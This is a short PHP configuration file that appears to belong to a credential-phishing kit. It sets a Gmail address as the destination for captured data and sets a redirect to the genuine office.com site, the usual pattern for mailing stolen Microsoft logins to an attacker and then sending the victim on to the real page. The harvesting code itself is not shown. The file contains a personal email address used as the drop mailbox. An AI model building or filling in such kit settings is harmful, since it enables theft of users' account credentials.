<?php 
$Receive_email="classicseaqueen@gmail.com";
$redirect="https://www.office.com/";
?>